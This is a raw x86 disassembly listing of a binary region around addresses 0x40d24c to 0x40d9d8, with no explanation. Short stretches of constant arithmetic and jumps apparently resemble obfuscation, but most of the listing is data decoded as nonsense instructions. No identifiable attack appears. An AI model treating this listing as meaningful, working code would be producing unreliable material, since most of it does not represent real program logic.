  40d24c:	in     eax,dx
  40d24d:	xor    bl,bh
  40d24f:	leave  
  40d250:	dec    eax
  40d251:	pop    ebx
  40d252:	test   BYTE PTR [eax],dh
  40d254:	(bad)  
  40d255:	sbb    cl,BYTE PTR [ebx+0x2735781a]
  40d25b:	pop    ecx
  40d25c:	pop    esi
  40d25d:	xor    al,0x88
  40d25f:	add    al,0xe
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	mov    eax,DWORD PTR [eax]
  40d2f4:	retf   
  40d2f5:	jo     0x40d324
  40d2f7:	loop   0x40d311
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [esi+0x2930e4ba],dh
  40d303:	ret    
  40d304:	add    BYTE PTR [ebp+0x497bd855],bl
  40d30a:	adc    bl,BYTE PTR [edx+0x62]
  40d30d:	xchg   DWORD PTR [esi],eax
  40d30f:	imul   ebx,DWORD PTR [eax-0x5a],0x57
  40d313:	mov    esi,0x27202cfc
  40d318:	ins    DWORD PTR es:[edi],dx
  40d319:	inc    eax
  40d31a:	mov    ds:0xc3e12488,eax
  40d31f:	loop   0x40d378
  40d321:	jg     0x40d35d
  40d323:	mov    WORD PTR [edi+0x6ce553a5],?
  40d329:	pop    esi
  40d32a:	cli    
  40d32b:	dec    edi
  40d32c:	sub    al,0x97
  40d32e:	jnp    0x40d364
  40d330:	jecxz  0x40d37d
  40d332:	cmp    BYTE PTR [edx-0x2a],dh
  40d335:	adc    DWORD PTR [eax-0x15],eax
  40d338:	jmp    0x1e48dd33
  40d33d:	xchg   esp,eax
  40d33e:	sub    al,0x24
  40d340:	cli    
  40d341:	sub    BYTE PTR [ebp+0x1d],cl
  40d344:	xor    DWORD PTR [ecx-0xb],ebx
  40d347:	push   edx
  40d348:	stos   BYTE PTR es:[edi],al
  40d349:	sbb    ah,BYTE PTR ds:0x50ebb521
  40d34f:	or     esi,DWORD PTR [ecx+edi*4]
  40d352:	jecxz  0x40d332
  40d354:	sub    bl,BYTE PTR ds:0x85c471bf
  40d35a:	push   edx
  40d35b:	mov    edi,0xdc698ab4
  40d360:	rep ins DWORD PTR es:[edi],dx
  40d362:	dec    ebx
  40d363:	mov    BYTE PTR [eax+0x47],dh
  40d366:	int3   
  40d367:	xchg   edx,eax
  40d368:	iret   
  40d369:	push   0x779ed379
  40d36e:	nop
  40d36f:	push   esi
  40d370:	test   al,0x32
  40d372:	repz sbb eax,0x9833022d
  40d378:	mov    DWORD PTR [ebp+0x1cf2caf6],edi
  40d37e:	loopne 0x40d311
  40d380:	jp     0x40d3c3
  40d382:	sub    al,BYTE PTR [edx]
  40d384:	or     DWORD PTR [ebp-0x434dbbde],esp
  40d38a:	cmp    al,0x49
  40d38c:	lahf   
  40d38d:	aaa    
  40d38e:	mov    bl,0x39
  40d390:	cmp    al,0xc7
  40d392:	inc    esp
  40d393:	mov    ds:0x9d38b93e,eax
  40d398:	sahf   
  40d399:	mov    bl,0x39
  40d39b:	or     ecx,DWORD PTR [ebp-0x13]
  40d39e:	sbb    BYTE PTR [ebx+eiz*1-0x12de9f3e],ch
  40d3a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3a6:	inc    ebp
  40d3a7:	loopne 0x40d3da
  40d3a9:	xchg   BYTE PTR [ebx],cl
  40d3ab:	xchg   DWORD PTR [ebx],eax
  40d3ad:	xchg   edx,eax
  40d3ae:	retf   0xae99
  40d3b1:	sub    eax,0x976c95bf
  40d3b6:	(bad)  
  40d3b7:	cmp    al,0x61
  40d3b9:	ins    BYTE PTR es:[edi],dx
  40d3ba:	jb     0x40d426
  40d3bc:	arpl   WORD PTR [ecx+0x64],ax
  40d3bf:	or     bh,BYTE PTR [ebx+0x2cd37ba1]
  40d3c5:	jmp    0x40d373
  40d3c7:	stos   BYTE PTR es:[edi],al
  40d3c8:	aas    
  40d3c9:	xchg   ebx,eax
  40d3ca:	fcomp  DWORD PTR [eax+0x10]
  40d3cd:	jo     0x40d372
  40d3cf:	jns    0x40d3ca
  40d3d1:	in     al,dx
  40d3d2:	pop    edx
  40d3d3:	jbe    0x40d3ed
  40d3d5:	lods   eax,DWORD PTR ds:[esi]
  40d3d6:	push   edx
  40d3d7:	adc    bl,0x1c
  40d3da:	jno    0x40d392
  40d3dc:	cld    
  40d3dd:	push   0x71efe24d
  40d3e2:	inc    esi
  40d3e3:	das    
  40d3e4:	jmp    0x40d434
  40d3e6:	sub    BYTE PTR [ecx+0x55d8eb67],0x6f
  40d3ed:	lods   eax,DWORD PTR ds:[esi]
  40d3ee:	repz push ss
  40d3f0:	xor    al,0x4b
  40d3f2:	mov    edx,0x96563a6f
  40d3f7:	push   cs
  40d3f8:	sub    ch,BYTE PTR [esi]
  40d3fa:	stos   BYTE PTR es:[edi],al
  40d3fb:	ret    0xae81
  40d3fe:	and    al,0x12
  40d400:	jg     0x40d38f
  40d402:	and    al,0xb0
  40d404:	sub    DWORD PTR [ebp+0x38b54883],esp
  40d40a:	mov    al,0x54
  40d40c:	(bad)  
  40d40d:	inc    eax
  40d40e:	int3   
  40d40f:	daa    
  40d410:	(bad)  
  40d411:	in     al,dx
  40d412:	xor    ebx,DWORD PTR [ebx-0x64ba7daa]
  40d418:	jnp    0x40d43d
  40d41a:	and    BYTE PTR [ecx],ch
  40d41c:	fdiv   st(0),st
  40d41e:	adc    eax,0xcf3f53fb
  40d423:	test   al,0x3c
  40d425:	fs pop esi
  40d427:	inc    esp
  40d428:	bound  eax,QWORD PTR [eax]
  40d42a:	ds in  al,0x8b
  40d42d:	hlt    
  40d42e:	js     0x40d3b7
  40d430:	mov    edx,0x9b589b0b
  40d435:	mov    ds:0x674ea083,eax
  40d43a:	xlat   BYTE PTR ds:[ebx]
  40d43b:	mov    ebx,0x3885f506
  40d440:	repz call 0xfb2:0x79466f07
  40d448:	outs   dx,DWORD PTR ds:[esi]
  40d449:	test   al,0xc2
  40d44b:	xchg   ebp,eax
  40d44c:	or     al,0xe7
  40d44e:	jle    0x40d3d0
  40d450:	sbb    eax,0x2d72598a
  40d455:	sbb    al,0x10
  40d457:	ja     0x40d406
  40d459:	or     al,0xa
  40d45b:	mov    ebp,esi
  40d45d:	push   ebp
  40d45e:	jp     0x40d438
  40d460:	out    0x5a,al
  40d462:	xor    eax,0xb4c622d6
  40d467:	int    0x0
  40d469:	and    al,BYTE PTR [ecx+0x6e]
  40d46c:	inc    ebx
  40d46d:	ret    0xdd48
  40d470:	scas   al,BYTE PTR es:[edi]
  40d471:	test   al,0xc9
  40d473:	repz (bad) 
  40d475:	ins    DWORD PTR es:[edi],dx
  40d476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d477:	or     BYTE PTR [ecx+0x7d],al
  40d47a:	push   esi
  40d47b:	stos   BYTE PTR es:[edi],al
  40d47c:	cmp    ebx,eax
  40d47e:	fmul   QWORD PTR [esi]
  40d480:	xchg   ecx,eax
  40d481:	test   DWORD PTR [ecx-0x3c8d73ab],0xe89fd320
  40d48b:	mov    ds:0xde01ecca,eax
  40d490:	jmp    FWORD PTR [eax-0x41]
  40d493:	mov    ebx,0x9e2892bf
  40d498:	pop    edi
  40d499:	enter  0x5802,0x3e
  40d49d:	pop    esp
  40d49e:	dec    esp
  40d49f:	pop    esp
  40d4a0:	js     0x40d50c
  40d4a2:	cmp    edi,ebp
  40d4a4:	jmp    0x642b:0x97263f00
  40d4ab:	ss xor edi,DWORD PTR gs:0xec107b7f
  40d4b3:	pop    ss
  40d4b4:	jmp    DWORD PTR [edi+eiz*4+0x16]
  40d4b8:	ins    BYTE PTR es:[edi],dx
  40d4b9:	fisttp QWORD PTR [ecx+0x5c]
  40d4bc:	ins    DWORD PTR es:[edi],dx
  40d4bd:	mul    DWORD PTR [eax]
  40d4bf:	jle    0x40d50e
  40d4c1:	test   BYTE PTR [bp+si+0x47],ch
  40d4c5:	adc    al,0x60
  40d4c7:	jbe    0x40d476
  40d4c9:	in     eax,dx
  40d4ca:	xlat   BYTE PTR ds:[ebx]
  40d4cb:	fadd   DWORD PTR [ebp-0x50]
  40d4ce:	inc    eax
  40d4cf:	sub    edi,DWORD PTR [edi]
  40d4d1:	rcl    BYTE PTR [ebp-0x5c894e6b],cl
  40d4d7:	push   0x3603ca35
  40d4dc:	fwait
  40d4dd:	xchg   esi,eax
  40d4de:	mov    eax,DWORD PTR [ebx+0x5f]
  40d4e1:	fadd   QWORD PTR [eax-0x2be700ff]
  40d4e7:	retf   0x9a85
  40d4ea:	sub    bl,BYTE PTR [edx+edi*8]
  40d4ed:	xor    eax,0xc65b943c
  40d4f2:	mov    cl,0x62
  40d4f4:	sub    eax,0xfc05d3ff
  40d4f9:	pop    ds
  40d4fa:	sahf   
  40d4fb:	mov    eax,ds:0x5d22373c
  40d500:	ffreep st(4)
  40d502:	sti    
  40d503:	mov    ch,0x5b
  40d505:	pop    ecx
  40d506:	dec    esi
  40d507:	xor    ebx,DWORD PTR [edx-0x45]
  40d50a:	pop    eax
  40d50b:	pop    ebx
  40d50c:	sub    al,0xfd
  40d50e:	test   eax,0xeaac9a42
  40d513:	dec    ecx
  40d514:	addr16 (bad) 
  40d516:	mov    ebx,0xffa34aa3
  40d51b:	sub    ebx,ebx
  40d51d:	retf   
  40d51e:	cld    
  40d51f:	add    BYTE PTR [ecx],0xae
  40d522:	mov    eax,ds:0x7c9cbf65
  40d527:	pop    ds
  40d528:	gs push 0x2e
  40d52b:	imul   esi,DWORD PTR [eax],0x34ba03e7
  40d531:	test   DWORD PTR [edx+0x7445254d],esp
  40d537:	xor    eax,0x70ebc8b2
  40d53c:	retf   
  40d53d:	push   ecx
  40d53e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d53f:	mov    esp,0x9976f7c9
  40d544:	xchg   ecx,ecx
  40d546:	pusha  
  40d547:	jp     0x40d55f
  40d549:	xchg   BYTE PTR [ebx-0x2dcbb069],bh
  40d54f:	inc    esi
  40d550:	stos   DWORD PTR es:[edi],eax
  40d551:	sbb    al,0x53
  40d553:	in     al,dx
  40d554:	xchg   esp,eax
  40d555:	rcr    DWORD PTR [ebp+edx*8+0x10d64886],1
  40d55c:	xchg   esi,eax
  40d55d:	out    dx,al
  40d55e:	xchg   edi,eax
  40d55f:	enter  0xb5ff,0xcc
  40d563:	mov    ebx,0x74e78440
  40d568:	aaa    
  40d569:	outs   dx,BYTE PTR ds:[esi]
  40d56a:	ret    0xb86d
  40d56d:	push   esp
  40d56e:	mov    dl,0xc3
  40d570:	or     ah,BYTE PTR [edx+edx*8-0x27fab67e]
  40d577:	cmp    edi,esp
  40d579:	push   esp
  40d57a:	xchg   DWORD PTR [eax],ebx
  40d57c:	into   
  40d57d:	fstp   DWORD PTR [edx+0x7e]
  40d580:	out    0x31,eax
  40d582:	dec    esp
  40d583:	push   edx
  40d584:	mov    esp,0xfa84682e
  40d589:	fadd   st(3),st
  40d58b:	out    0xb3,al
  40d58d:	enter  0xdc35,0xc8
  40d591:	sbb    al,0x88
  40d593:	and    ebx,ebp
  40d595:	or     al,0x9
  40d597:	push   ss
  40d598:	and    edi,esp
  40d59a:	mov    esi,edx
  40d59c:	inc    edi
  40d59d:	aaa    
  40d59e:	push   edx
  40d59f:	jmp    0x41c91204
  40d5a4:	and    cl,BYTE PTR [ebx-0x2dcc1fb3]
  40d5aa:	jmp    0x40d86e
  40d5af:	pop    edx
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	jae    0x40d5bd
  40d5bd:	xor    DWORD PTR [eax+0x1818dce7],0x181814d2
  40d5c7:	pop    eax
  40d5c8:	mov    edx,0x53aa2fad
  40d5cd:	mov    eax,0x8e2a7ddf
  40d5d2:	lea    edi,[ebx]
  40d5d4:	xchg   ecx,eax
  40d5d5:	xchg   edx,eax
  40d5d6:	in     al,dx
  40d5d7:	test   BYTE PTR [edx+ebp*8+0x10343fe9],dh
  40d5de:	ds fwait
  40d5e0:	ins    BYTE PTR es:[edi],dx
  40d5e1:	les    esp,FWORD PTR [ebp-0x17809fb1]
  40d5e7:	pop    ecx
  40d5e8:	or     DWORD PTR [esi],0xffffffae
  40d5eb:	inc    ebp
  40d5ec:	pop    ds
  40d5ed:	xor    BYTE PTR [edi+0x7],ah
  40d5f0:	fldenv ds:[eax-0x3bed90d]
  40d5f7:	jne    0x40d58b
  40d5f9:	std    
  40d5fa:	ror    DWORD PTR [esi+0x393859ae],1
  40d600:	addr16 lahf 
  40d602:	jo     0x40d58e
  40d604:	push   ss
  40d605:	xchg   edx,eax
  40d606:	sti    
  40d607:	fldenv [eax+ebp*2]
  40d60a:	retf   0x15bd
  40d60d:	mov    edi,0x4d1c612
  40d612:	xor    esi,DWORD PTR [edx]
  40d614:	jle    0x40d685
  40d616:	in     eax,0x12
  40d618:	int    0xde
  40d61a:	(bad)  
  40d61b:	jno    0x40d5e2
  40d61d:	cmc    
  40d61e:	aam    0x4a
  40d620:	add    al,0xa0
  40d622:	jmp    0xb3f2:0x2802cb5e
  40d629:	mov    cl,0xe6
  40d62b:	out    0x48,eax
  40d62d:	(bad)  
  40d62e:	mov    ebx,DWORD PTR [eax+esi*2]
  40d631:	jae    0x40d66b
  40d633:	and    ebp,ebp
  40d635:	adc    BYTE PTR [edi-0x7e],0xf8
  40d639:	test   DWORD PTR [ebp-0x65],edi
  40d63c:	sub    DWORD PTR [eax-0x3ac32d09],ecx
  40d642:	cmp    al,0x6d
  40d644:	in     al,dx
  40d645:	lods   al,BYTE PTR ds:[esi]
  40d646:	(bad)  
  40d647:	adc    eax,0xfc72c81f
  40d64c:	jne    0x40d69d
  40d64e:	fstp   DWORD PTR [eax-0x55]
  40d651:	mov    al,0x4
  40d653:	sub    DWORD PTR [edx+0x7d],ebp
  40d656:	(bad)  
  40d657:	sub    al,0x3b
  40d659:	imul   edi,DWORD PTR [ebx+0x12344cb7],0xffffff81
  40d660:	dec    eax
  40d661:	pop    ebx
  40d662:	xchg   esp,eax
  40d663:	and    eax,0xdae25890
  40d668:	(bad)  
  40d669:	aad    0x68
  40d66b:	dec    edi
  40d66c:	mov    al,ds:0xba36a527
  40d671:	lahf   
  40d672:	xlat   BYTE PTR ds:[ebx]
  40d673:	push   ebp
  40d674:	mov    cl,0x52
  40d676:	add    al,0x47
  40d678:	jge    0x40d662
  40d67a:	xor    cl,ah
  40d67c:	mov    ebx,0xc4c904ce
  40d681:	jmp    0x40d60f
  40d683:	out    0x22,eax
  40d685:	iret   
  40d686:	xchg   BYTE PTR [edx-0x26],ah
  40d689:	inc    ebx
  40d68a:	scas   eax,DWORD PTR es:[edi]
  40d68b:	mov    edx,0xd13731af
  40d690:	jge    0x40d63b
  40d692:	push   ecx
  40d693:	push   edi
  40d694:	inc    edi
  40d695:	retf   
  40d696:	pop    DWORD PTR [ebp+eiz*8-0x31]
  40d69a:	retf   
  40d69b:	pop    es
  40d69c:	loope  0x40d6fc
  40d69e:	mov    edi,0x58e60866
  40d6a3:	xor    bh,BYTE PTR [edi-0x68]
  40d6a6:	fadd   DWORD PTR [eax]
  40d6a8:	into   
  40d6a9:	and    DWORD PTR [esp+eax*4],edx
  40d6ac:	inc    edi
  40d6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ae:	cld    
  40d6af:	dec    edi
  40d6b0:	adc    BYTE PTR [esi-0xa],dl
  40d6b3:	pushf  
  40d6b4:	jno    0x40d647
  40d6b6:	push   ebx
  40d6b7:	pop    edi
  40d6b8:	aad    0xc3
  40d6ba:	fcmovb st,st(7)
  40d6bc:	icebp  
  40d6bd:	lods   eax,DWORD PTR ds:[esi]
  40d6be:	loopne 0x40d710
  40d6c0:	add    dl,BYTE PTR [ecx+0x3b]
  40d6c3:	sti    
  40d6c4:	push   0xffffffb5
  40d6c6:	das    
  40d6c7:	jg     0x40d69e
  40d6c9:	or     al,cl
  40d6cb:	push   ecx
  40d6cc:	imul   esp,DWORD PTR [ebx+0x1281ff06],0x91d33dc7
  40d6d6:	jae    0x40d691
  40d6d8:	dec    esi
  40d6d9:	nop
  40d6da:	imul   edx,ebp,0xffffffe0
  40d6dd:	mov    eax,ds:0x2b7e8fc7
  40d6e2:	out    dx,eax
  40d6e3:	outs   dx,DWORD PTR ds:[esi]
  40d6e4:	ja     0x40d712
  40d6e6:	mov    ss,ebp
  40d6e8:	enter  0x1221,0xc
  40d6ec:	sub    ah,dl
  40d6ee:	inc    ecx
  40d6ef:	mov    dl,0x21
  40d6f1:	adc    DWORD PTR [ecx+0x5b],edi
  40d6f4:	mov    bl,0x8d
  40d6f6:	retf   0x9c4e
  40d6f9:	xchg   ebx,eax
  40d6fa:	daa    
  40d6fb:	jge    0x40d760
  40d6fd:	outs   dx,DWORD PTR ds:[esi]
  40d6fe:	das    
  40d6ff:	aaa    
  40d700:	inc    ebp
  40d701:	sahf   
  40d702:	or     eax,0x88aa923a
  40d707:	pop    ss
  40d708:	mov    ds:0xc843e13c,eax
  40d70d:	popa   
  40d70e:	mov    al,ds:0xeceafc0b
  40d713:	cmp    esp,DWORD PTR [ebx-0x2e2b298b]
  40d719:	jne    0x40d6d6
  40d71b:	add    dl,BYTE PTR [ebx]
  40d71d:	retf   
  40d71e:	and    BYTE PTR [ebx-0x1e],dl
  40d721:	mov    ecx,0x6500c646
  40d726:	xchg   edi,eax
  40d727:	cdq    
  40d728:	mov    DWORD PTR [ecx+0x7ad7122],esp
  40d72e:	fld    DWORD PTR [edx-0x27dac7ce]
  40d734:	js     0x40d750
  40d736:	arpl   WORD PTR [ebx-0x5c864d38],dx
  40d73c:	retf   
  40d73d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d73e:	out    0xb,al
  40d740:	stos   BYTE PTR es:[edi],al
  40d741:	inc    edx
  40d742:	jmp    0x479b:0x4f135c82
  40d749:	mov    edx,0x2f23cc6f
  40d74e:	mov    bh,dl
  40d750:	jecxz  0x40d6ed
  40d752:	loopne 0x40d71a
  40d754:	push   ss
  40d755:	das    
  40d756:	test   bl,0x3
  40d759:	rcl    BYTE PTR [ecx],1
  40d75b:	push   esp
  40d75c:	and    al,0x4
  40d75e:	xchg   ebx,eax
  40d75f:	scas   eax,DWORD PTR es:[edi]
  40d760:	mov    eax,ds:0x29e614a
  40d765:	xor    eax,0xf4e3e4ae
  40d76a:	stos   BYTE PTR es:[edi],al
  40d76b:	call   0xf6fa:0x322fc523
  40d772:	enter  0x8b8b,0xed
  40d776:	(bad)  
  40d778:	popfw  
  40d77a:	or     al,0x49
  40d77c:	jle    0x40d71b
  40d77e:	hlt    
  40d77f:	not    DWORD PTR [esi]
  40d781:	push   0xf9bacbcf
  40d786:	xchg   esp,eax
  40d787:	sub    BYTE PTR [edi-0x4c9de154],cl
  40d78d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d78e:	cmp    esi,ebp
  40d790:	cmp    al,0x2d
  40d792:	add    DWORD PTR [esi+0x5fcd33a9],esi
  40d798:	or     edi,DWORD PTR [esi+0x176800e5]
  40d79e:	test   al,0x4
  40d7a0:	dec    edx
  40d7a1:	lock or BYTE PTR [ebp-0x5dc6e036],dl
  40d7a8:	add    DWORD PTR [eax],esp
  40d7aa:	arpl   WORD PTR [esi],di
  40d7ac:	test   BYTE PTR [eax+0x63ed2619],ah
  40d7b2:	inc    ebx
  40d7b3:	ss loopne 0x40d7b1
  40d7b6:	xor    eax,0x83853bb2
  40d7bb:	in     eax,dx
  40d7bc:	and    al,0x9c
  40d7be:	cli    
  40d7bf:	jns    0x40d819
  40d7c1:	sbb    ah,BYTE PTR [edx+0x4c]
  40d7c4:	icebp  
  40d7c5:	mov    ebx,0x254aee68
  40d7ca:	bound  esi,QWORD PTR [edx]
  40d7cc:	mov    ah,0x18
  40d7ce:	dec    ebp
  40d7cf:	mov    al,ds:0xbe8539cf
  40d7d4:	dec    esi
  40d7d5:	test   BYTE PTR [edx-0x69],dl
  40d7d8:	out    dx,al
  40d7d9:	mov    es,WORD PTR [ecx]
  40d7db:	mov    bh,0x6b
  40d7dd:	add    DWORD PTR [esp+esi*2],edx
  40d7e0:	mov    esp,ds
  40d7e2:	or     eax,esi
  40d7e4:	lahf   
  40d7e5:	and    DWORD PTR [edi+ebx*8+0x78791f10],esp
  40d7ec:	xlat   BYTE PTR ds:[ebx]
  40d7ed:	scas   eax,DWORD PTR es:[edi]
  40d7ee:	out    0xa2,eax
  40d7f0:	mov    ebx,0xac7e0688
  40d7f5:	es inc eax
  40d7f7:	mov    eax,edx
  40d7f9:	retf   0xf0af
  40d7fc:	ss pop ebp
  40d7fe:	call   0x50da0ecf
  40d803:	mov    ds:0xb7d1630e,al
  40d808:	xchg   esi,eax
  40d809:	scas   eax,DWORD PTR es:[edi]
  40d80a:	xchg   edx,eax
  40d80b:	adc    esp,DWORD PTR [edx-0x2f]
  40d80e:	repnz test eax,0x92c4edbb
  40d814:	ret    
  40d815:	cld    
  40d816:	outs   dx,DWORD PTR ds:[esi]
  40d817:	push   eax
  40d818:	cmp    DWORD PTR [ecx],0x72
  40d81b:	mov    esi,0xb53c328
  40d820:	add    al,0x95
  40d822:	clc    
  40d823:	mov    edx,0xb06966a7
  40d828:	inc    edi
  40d829:	imul   ebx,DWORD PTR [eax],0xffffff9d
  40d82c:	lock lds edx,FWORD PTR [eiz*2+0x7c55f0c1]
  40d834:	and    eax,0xdbeb4e6c
  40d839:	pop    ebp
  40d83a:	mov    cl,al
  40d83c:	mov    al,ds:0x9a8ab800
  40d841:	aam    0xfe
  40d843:	inc    ebp
  40d844:	test   al,0xca
  40d846:	inc    ebp
  40d847:	adc    BYTE PTR [edx+0x261e2bfb],cl
  40d84d:	push   edx
  40d84e:	xchg   ebp,eax
  40d84f:	clc    
  40d850:	mov    ds:0xac0cb24,eax
  40d855:	fadd   DWORD PTR [ecx-0x20]
  40d858:	or     BYTE PTR [ebp+0x1a],0xac
  40d85c:	out    0xf0,al
  40d85e:	adc    eax,0x689e7538
  40d863:	mov    WORD PTR [eax-0x403809f9],gs
  40d869:	call   0xb5bf:0xa01b3be8
  40d870:	dec    ebp
  40d871:	add    BYTE PTR [eax],al
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0x9dee17bc
  40d894:	jo     0x40d836
  40d896:	fcomp  DWORD PTR [eax]
  40d898:	sbb    dl,dl
  40d89a:	adc    al,0x18
  40d89c:	sbb    dh,al
  40d89e:	mov    BYTE PTR [eax+esi*1],bl
  40d8a1:	xchg   ebp,eax
  40d8a2:	test   al,0xfa
  40d8a4:	test   eax,0xfa240b3a
  40d8a9:	sub    BYTE PTR [ebp-0x6b68c47d],dh
  40d8af:	cmp    DWORD PTR [ebp-0x1f0f0dc7],ebp
  40d8b5:	or     ebp,ebx
  40d8b7:	ds (bad) 
  40d8b9:	jg     0x40d882
  40d8bb:	out    dx,eax
  40d8bc:	xor    BYTE PTR [ecx+0x15],dl
  40d8bf:	daa    
  40d8c0:	xchg   edx,eax
  40d8c1:	pop    DWORD PTR [eax-0x6e]
  40d8c4:	mov    bh,0x84
  40d8c6:	sbb    ebp,eax
  40d8c8:	push   edx
  40d8c9:	jo     0x40d878
  40d8cb:	jnp    0x40d8ec
  40d8cd:	sub    al,BYTE PTR [edx-0x5a]
  40d8d0:	sub    edi,esi
  40d8d2:	mov    ebx,0x903804ce
  40d8d7:	and    al,0xf6
  40d8d9:	sbb    eax,0xc143ee61
  40d8de:	in     al,dx
  40d8df:	adc    DWORD PTR [esi-0x76a38dab],ebp
  40d8e5:	enter  0x5d01,0xa4
  40d8e9:	xchg   esi,eax
  40d8ea:	shl    BYTE PTR [esi],1
  40d8ec:	jno    0x40d8d3
  40d8ee:	and    edi,DWORD PTR [eax]
  40d8f0:	sub    al,0x7e
  40d8f2:	pop    edi
  40d8f3:	or     BYTE PTR [edi-0x58],bh
  40d8f6:	mov    edi,0xb6cd8acb
  40d8fb:	shl    dl,0x88
  40d8fe:	fistp  WORD PTR ds:[edi-0x43]
  40d902:	sub    eax,0xe5948726
  40d907:	inc    edx
  40d908:	ror    BYTE PTR [ebx-0x57],cl
  40d90b:	cdq    
  40d90c:	mov    ebp,0x92415935
  40d911:	sbb    eax,0xb6c5ae3f
  40d916:	pop    edi
  40d917:	mov    ebx,0xc2dc3016
  40d91c:	or     esp,DWORD PTR [ebp+0x205ca696]
  40d922:	dec    edi
  40d923:	and    al,0x50
  40d925:	pop    ebx
  40d926:	pop    esi
  40d927:	jo     0x40d99d
  40d929:	xor    BYTE PTR [edi+0x13],0x1a
  40d92d:	adc    eax,0xe29ee874
  40d932:	test   BYTE PTR [ebx+ecx*8+0x1cbcd68e],ch
  40d939:	dec    edx
  40d93a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d93b:	push   es
  40d93c:	sbb    al,0x4b
  40d93e:	cmp    al,0xd8
  40d940:	inc    edi
  40d941:	sub    al,0xe7
  40d943:	add    ebp,DWORD PTR [ebx+0x6ed225b]
  40d949:	sub    eax,0xdd9ee72f
  40d94e:	cmp    DWORD PTR [esi+0x7b],0xfffffff3
  40d952:	out    dx,eax
  40d953:	js     0x40d954
  40d955:	push   eax
  40d956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d957:	mov    es,esp
  40d959:	sbb    DWORD PTR [edi],0x17
  40d95c:	add    edi,eax
  40d95e:	or     al,0x4d
  40d960:	scas   eax,DWORD PTR es:[edi]
  40d961:	test   BYTE PTR [ecx],dl
  40d963:	aam    0xee
  40d965:	adc    eax,0x7fee94c1
  40d96a:	pop    ebx
  40d96b:	add    dl,BYTE PTR [eax-0x4a]
  40d96e:	xchg   esp,eax
  40d96f:	xor    edi,DWORD PTR [ecx]
  40d971:	push   edx
  40d972:	call   FWORD PTR [eax-0x392b2e38]
  40d978:	sahf   
  40d979:	cs sti 
  40d97b:	out    dx,eax
  40d97c:	cld    
  40d97d:	int3   
  40d97e:	sub    bl,dl
  40d980:	inc    edi
  40d981:	xchg   ebp,eax
  40d982:	xor    edi,DWORD PTR [ebx+0x94794c4]
  40d988:	pop    edx
  40d989:	(bad)  
  40d98a:	into   
  40d98b:	loopne 0x40d993
  40d98d:	mov    edi,0xbb736c03
  40d992:	sub    eax,0x80703969
  40d997:	push   0xdedd66ac
  40d99c:	mov    dl,0x1f
  40d99e:	pop    es
  40d99f:	dec    ecx
  40d9a0:	dec    ecx
  40d9a1:	inc    ebx
  40d9a2:	jae    0x40d9f2
  40d9a4:	stos   DWORD PTR es:[edi],eax
  40d9a5:	repz fild QWORD PTR [ecx+0x3329f928]
  40d9ac:	pop    edi
  40d9ad:	xor    BYTE PTR ds:0x18f38fef,bl
  40d9b3:	mov    edx,0xa248fd1e
  40d9b8:	in     al,dx
  40d9b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ba:	(bad)  
  40d9bb:	sar    ah,cl
  40d9bd:	cmp    eax,0x5188c6bb
  40d9c2:	sub    dl,BYTE PTR [esi+0x76]
  40d9c5:	cmp    al,dh
  40d9c7:	es lahf 
  40d9c9:	sbb    DWORD PTR [ebx+0xf],eax
  40d9cc:	lods   al,BYTE PTR ds:[esi]
  40d9cd:	int3   
  40d9ce:	lods   al,BYTE PTR ds:[esi]
  40d9cf:	mov    esp,0x1b188649
  40d9d4:	mov    BYTE PTR es:[edi],ch
  40d9d7:	pop    edi
  40d9d8:	xchg   ecx,ecx
